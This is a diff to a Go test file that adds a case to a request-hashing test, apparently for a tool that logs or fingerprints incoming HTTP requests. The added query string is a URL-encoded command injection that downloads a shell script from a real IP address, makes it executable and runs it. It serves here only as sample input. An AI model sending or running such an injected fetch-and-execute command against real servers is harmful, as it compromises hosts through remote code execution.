@@ -24,6 +24,16 @@ func TestHashRequestOk(t *testing.T) {
 			expectedHash: "5574171b47fbd5919b72e75c59d82220b621b25a1343807870ae8d5d4ec751db",
 		},
 		{
+			description: "parses weird query OK",
+			testRequest: Request{
+				Method:  "GET",
+				Path:    "/rssui/public/rssdb_dump.xml",
+				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
+				Query:   "path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22",
+			},
+			expectedHash: "0b2103a9d4577e2fba8390acc4da751b83708d7048e0b3db68380aca831b2db6",
+		},
+		{
 			description: "simple request hashes ok, different query values, same hash",
 			testRequest: Request{
 				Method:  "GET",
